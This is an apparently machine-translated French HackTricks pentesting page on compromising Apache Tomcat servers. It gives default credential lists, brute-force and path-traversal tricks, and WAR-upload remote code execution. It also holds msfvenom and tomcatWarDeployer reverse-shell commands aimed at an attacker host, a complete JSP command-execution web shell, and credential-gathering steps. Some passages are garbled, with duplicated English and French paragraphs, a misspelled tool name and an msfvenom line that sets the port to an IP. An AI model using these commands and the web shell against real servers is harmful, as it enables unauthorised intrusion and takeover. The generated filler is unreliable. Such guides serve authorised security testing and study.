# Tomcat

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des probl√®mes dans toute votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## D√©couverte

* Il fonctionne g√©n√©ralement sur le **port 8080**
* **Erreur courante de Tomcat :**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## √ânum√©ration

### Version
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author"
```
### Localiser les fichiers du gestionnaire

Il est int√©ressant de trouver o√π se trouvent les pages **`/manager`** et **`/host-manager`** car elles peuvent avoir un nom diff√©rent. Vous pouvez les rechercher avec une attaque par force brute.

### √ânum√©ration des noms d'utilisateur

Dans certaines versions ant√©rieures √† Tomcat6, vous pouviez √©num√©rer les utilisateurs :
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### Identifiants par d√©faut

Le chemin le plus int√©ressant de Tomcat est _**/manager/html**_, √† l'int√©rieur de ce **chemin, vous pouvez t√©l√©charger et d√©ployer des fichiers war** (ex√©cuter du code). Mais ce chemin est prot√©g√© par une authentification HTTP de base, les identifiants les plus courants sont :

* admin:admin
* tomcat:tomcat
* admin:\<RIEN>
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

Vous pouvez tester ces identifiants et d'autres en utilisant :
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Un autre chemin **int√©ressant de Tomcat** est _**/manager/status**_, o√π vous pouvez voir la version du syst√®me d'exploitation et de Tomcat. Cela est utile pour trouver des vuln√©rabilit√©s affectant la version de Tomcat lorsque vous ne pouvez pas acc√©der √† _**/manager/html.**_

### Bruteforce
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST tomacat-site.internal
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts <IP>
```
## Vuln√©rabilit√©s

### Divulgation de la trace arri√®re du mot de passe

Essayez d'acc√©der √† `/auth.jsp` et avec un peu de chance, il pourrait **divulguer le mot de passe dans une trace arri√®re**.

### Double encodage d'URL

Une vuln√©rabilit√© bien connue pour acc√©der au gestionnaire d'applications est mod_jk dans CVE-2007-1860, qui permet **la travers√©e de chemin avec double encodage d'URL**.

Pour acc√©der √† la gestion web de Tomcat, allez √† : _pathTomcat/%252E%252E/manager/html_

Notez que pour t√©l√©charger le webshell, vous devrez peut-√™tre utiliser l'astuce du double encodage d'URL et envoyer √©galement un cookie et/ou un jeton SSRF.\
Pour acc√©der √† la porte d√©rob√©e, vous devrez peut-√™tre √©galement utiliser l'astuce du double encodage d'URL.

### /examples

Les scripts d'exemple suivants fournis avec Apache Tomcat v4.x - v7.x peuvent √™tre utilis√©s par des attaquants pour obtenir des informations sur le syst√®me. Ces scripts sont √©galement connus pour √™tre vuln√©rables aux injections de script intersites (XSS) (√† partir de [ici](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)).

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### Travers√©e de chemin (..;/)

Dans certaines [**configurations vuln√©rables de Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/), vous pouvez acc√©der √† des r√©pertoires prot√©g√©s dans Tomcat en utilisant le chemin : `/..;/`

Ainsi, par exemple, vous pourriez √™tre en mesure d'**acc√©der √† la page du gestionnaire Tomcat** en acc√©dant √† : `www.vulnerable.com/lalala/..;/manager/html`

**Une autre fa√ßon** de contourner les chemins prot√©g√©s en utilisant cette astuce est d'acc√©der √† `http://www.vulnerable.com/;param=value/manager/html`

## RCE

Enfin, si vous avez acc√®s au gestionnaire d'applications Web de Tomcat, vous pouvez **t√©l√©charger et d√©ployer un fichier .war (ex√©cuter du code)**.

### Limitations

Vous ne pourrez d√©ployer un fichier WAR que si vous avez **suffisamment de privil√®ges** (r√¥les : **admin**, **manager** et **manager-script**). Ces d√©tails peuvent √™tre trouv√©s dans le fichier _tomcat-users.xml_ g√©n√©ralement d√©fini dans `/usr/share/tomcat9/etc/tomcat-users.xml` (cela varie selon les versions) (voir la section [POST](tomcat.md#post)).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit est un framework de test de p√©n√©tration largement utilis√© pour l'exploitation de vuln√©rabilit√©s dans les syst√®mes informatiques. Il offre une vaste gamme d'outils et de modules qui permettent aux testeurs de p√©n√©tration d'automatiser les attaques et de trouver des failles de s√©curit√© dans les applications et les r√©seaux.

Metasploit est √©crit en Ruby et est disponible en tant qu'outil open source. Il est utilis√© par les professionnels de la s√©curit√© pour √©valuer la s√©curit√© des syst√®mes et pour effectuer des tests de p√©n√©tration. Metasploit est √©galement utilis√© par les hackers √©thiques pour tester la s√©curit√© de leurs propres syst√®mes et pour trouver des vuln√©rabilit√©s avant que les cybercriminels ne les exploitent.

Le framework Metasploit comprend un certain nombre de modules qui peuvent √™tre utilis√©s pour effectuer diff√©rentes t√¢ches lors d'un test de p√©n√©tration. Ces modules peuvent √™tre utilis√©s pour scanner des r√©seaux, rechercher des vuln√©rabilit√©s, exploiter des failles de s√©curit√© et ex√©cuter des attaques sp√©cifiques.

Metasploit est un outil puissant qui n√©cessite une connaissance approfondie des techniques de test de p√©n√©tration et des vuln√©rabilit√©s informatiques. Il est important de l'utiliser de mani√®re responsable et l√©gale, en obtenant l'autorisation appropri√©e avant de l'utiliser sur des syst√®mes qui ne vous appartiennent pas.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### Reverse Shell MSFVenom

Le shell invers√© MSFVenom est une technique couramment utilis√©e en pentest pour obtenir un acc√®s distant √† un syst√®me cible. Il permet √† un attaquant de prendre le contr√¥le du syst√®me cible en √©tablissant une connexion r√©seau invers√©e.

#### G√©n√©ration du payload

Pour g√©n√©rer le payload du shell invers√© √† l'aide de MSFVenom, utilisez la commande suivante :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<votre_IP> LPORT=<votre_port> -f war > shell.war
```

- `java/jsp_shell_reverse_tcp` : sp√©cifie le type de payload √† g√©n√©rer, dans ce cas, un shell invers√© JSP pour Tomcat.
- `LHOST` : sp√©cifie votre adresse IP, √† laquelle le shell invers√© se connectera.
- `LPORT` : sp√©cifie le port sur lequel le shell invers√© se connectera.

#### D√©ploiement du payload

Une fois que vous avez g√©n√©r√© le fichier `shell.war`, vous devez le d√©ployer sur le serveur Tomcat de la cible. Vous pouvez le faire en utilisant diverses m√©thodes, telles que l'envoi du fichier via une vuln√©rabilit√© d'injection de fichiers ou en le t√©l√©chargeant sur le serveur via une autre vuln√©rabilit√©.

Une fois que le fichier `shell.war` est d√©ploy√© sur le serveur Tomcat, vous pouvez acc√©der au shell invers√© en acc√©dant √† l'URL suivante :

```
http://<adresse_IP_cible>:<port_Tomcat>/shell/
```

#### √âtablissement de la connexion

Lorsque vous acc√©dez √† l'URL du shell invers√©, une connexion sera √©tablie entre votre machine et le syst√®me cible. Vous pourrez alors ex√©cuter des commandes sur le syst√®me cible √† partir de votre terminal.

Assurez-vous de configurer correctement votre pare-feu et de prendre toutes les pr√©cautions n√©cessaires pour prot√©ger votre syst√®me lors de l'utilisation de cette technique.
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
Ensuite, **t√©l√©chargez le fichier `revshell.war` et acc√©dez-y (**_**/revshell/**_**)**

### Lier et inverser la coquille avec [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

Dans certains sc√©narios, cela ne fonctionne pas (par exemple, les anciennes versions de sun)

#### T√©l√©chargement
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Reverse shell

Un reverse shell est une technique utilis√©e en pentest pour √©tablir une connexion entre un attaquant et une machine cible √† travers un r√©seau. Cela permet √† l'attaquant d'ex√©cuter des commandes sur la machine cible √† distance.

Pour √©tablir un reverse shell, l'attaquant doit d'abord compromettre la machine cible en exploitant une vuln√©rabilit√© ou en utilisant des techniques d'ing√©nierie sociale. Une fois que la machine cible est compromise, l'attaquant peut utiliser un script ou un programme pour √©tablir une connexion invers√©e avec sa propre machine.

Lorsque la connexion est √©tablie, l'attaquant peut ex√©cuter des commandes sur la machine cible comme s'il √©tait directement connect√© √† celle-ci. Cela peut inclure l'ex√©cution de commandes syst√®me, l'acc√®s √† des fichiers sensibles, la modification de configurations, etc.

Il est important de noter que l'utilisation d'un reverse shell pour acc√©der √† une machine sans autorisation est ill√©gale et peut entra√Æner des cons√©quences juridiques graves. Le reverse shell doit √™tre utilis√© uniquement √† des fins de pentest l√©gitimes et avec le consentement √©crit du propri√©taire du syst√®me cible.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Shell de liaison

A bind shell is a type of shell that listens for incoming connections on a specific port. When a connection is established, the bind shell provides a command prompt to the attacker, allowing them to execute commands on the compromised system. This type of shell is commonly used in network pentesting to gain remote access to a target system.

Un shell de liaison est un type de shell qui √©coute les connexions entrantes sur un port sp√©cifique. Lorsqu'une connexion est √©tablie, le shell de liaison fournit un invite de commande √† l'attaquant, lui permettant d'ex√©cuter des commandes sur le syst√®me compromis. Ce type de shell est couramment utilis√© dans le pentesting r√©seau pour obtenir un acc√®s distant √† un syst√®me cible.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Utilisation de [Culsterd](https://github.com/hatRiot/clusterd)

Culsterd is a tool that can be used for penetration testing of Apache Tomcat servers. It provides various modules that can be used to exploit vulnerabilities in Tomcat and gain unauthorized access to the server.

To use Culsterd, you first need to clone the repository from GitHub:

```
git clone https://github.com/hatRiot/clusterd.git
```

Once you have cloned the repository, navigate to the `clusterd` directory and install the required dependencies:

```
cd clusterd
pip install -r requirements.txt
```

After installing the dependencies, you can start Culsterd by running the following command:

```
python clusterd.py
```

This will start the Culsterd console, where you can interact with the various modules and execute attacks against the target Tomcat server.

Culsterd provides modules for different types of attacks, such as brute-forcing passwords, exploiting weak configurations, and uploading malicious files. Each module has its own set of options that can be configured to customize the attack.

To select a module, use the `use` command followed by the module name. For example, to use the `tomcat_manager` module, you would run:

```
use tomcat_manager
```

Once you have selected a module, you can view its options using the `show options` command. This will display a list of configurable options for the selected module.

To set a value for an option, use the `set` command followed by the option name and the desired value. For example, to set the target URL for the `tomcat_manager` module, you would run:

```
set url http://target-tomcat-server.com/manager/html
```

After configuring the options, you can execute the attack by running the `run` command. Culsterd will then attempt to exploit the vulnerability and provide feedback on the success or failure of the attack.

It is important to note that Culsterd should only be used for authorized penetration testing and not for any malicious purposes. Always ensure that you have proper authorization before conducting any tests using Culsterd.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### M√©thode manuelle - Web shell

Cr√©ez **index.jsp** avec ce [contenu](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) :
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Vous pouvez √©galement installer ceci (permet l'envoi, le t√©l√©chargement et l'ex√©cution de commandes) : [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### M√©thode manuelle 2

Obtenez un shell web JSP tel que [celui-ci](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) et cr√©ez un fichier WAR :
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Le nom du fichier d'identification de Tomcat est _tomcat-users.xml_.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Autres moyens de collecter les identifiants Tomcat :
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Autres outils de scan Tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des scans de menaces proactifs, trouve des probl√®mes dans toute votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
